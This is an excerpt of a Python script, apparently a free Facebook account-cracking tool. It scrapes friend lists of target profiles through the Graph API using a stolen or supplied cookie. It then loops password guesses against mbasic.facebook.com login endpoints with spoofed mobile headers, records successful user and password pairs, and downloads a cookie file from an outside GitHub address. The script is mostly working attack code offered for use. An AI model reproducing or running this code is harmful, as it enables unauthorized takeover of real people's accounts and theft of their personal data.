...
if not os.path.isfile('.cookies.txt'):
    os.system('curl -L https://raw.githubusercontent.com/mrpardesi007/files/main/.cookies.txt > .cookies.txt')
ct = datetime.now()
n = ct.month
...
def login():
    os.system('clear');print(banner)
    tok = input('\033[1;37m[+]  \033[1;36mPUTT COOKIE\033[1;31m : \033[1;32m')
    if 'EAAB' in tok:
        pass
    else:
        print('  \033[1;37mOnly fb ads cookie can be used for scraping data')
        print('  \033[1;37mCheck main menu for creating fb ads cookie....o')
        os.sys.exit()
    try:
        u = requests.get('https://graph.facebook.com/me?cookie='+tok).text
        u1 = json.loads(u)
        name = u1['name']
        ts = open('cookie.txt', 'w')
        ts.write(tok)
        ts.close()
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/cookie/"}
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			ses = requests.Session()
			headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Fcookie%2F', headers=headers_).text
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					cp_ttl = requests.get('https://graph.facebook.com/%s?cookie=%s'%(user,token)).json()['birthday']
...
def publiccrack():
    os.system('clear');print(banner)
    try:
        access_token = open('cookie.txt', 'r').read()
    except:
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?cookie='+access_token).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
...
class __cracking__:
	def __init__(self):
		...
		if not os.path.exists("cookie.txt"):
			login()
	def plerr(self):
		os.system("clear");print(banner);access_token = open('cookie.txt','r').read();dill=[];os.system("rm -rf .publicout.txt")
		...
		ys = open(ppk, 'a')
		rg = requests.get('https://graph.facebook.com/'+self.apk+'/friends?limit=5000&cookie='+cookie).text
		rgq = json.loads(rg)
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Fcookie%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/cookie/"}
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Fcookie%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mPSYCHO-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
...
def create_file():
    ...
    try:
        ...
        login()
    try:
        r = requests.get('https://graph.facebook.com/me?cookie='+cookie).text
        q = json.loads(r)
        uname = q['name']
    except:
        login()
    ...
    for fir in range(limit_user):
        ...
        try:
            tfile = open('cookie.txt','r').read()
            fr = requests.get('https://graph.facebook.com/'+udit+'/friends?limit=5000&cookie='+tfile).text
            qfr = json.loads(fr)
    ...
    for ids in fileidopen:
        try:
            tfile = open('cookie.txt','r').read()
            rg = requests.get('https://graph.facebook.com/'+ids+'/friends?limit=5000&cookie='+tfile).text
            rgq = json.loads(rg)
...
banner = """
  ...
  \033[0;91m ██      ██  ██████  ██████ ██   ██ ██ 
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m PSYCHO PICCHI│\033[1;37m• \033[1;36mTHIS TOOL IS FREE \033[1;37m•\033[1;32m │
...
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m PSYCHO PICCHI│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36mNo\033[1;37m•  \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
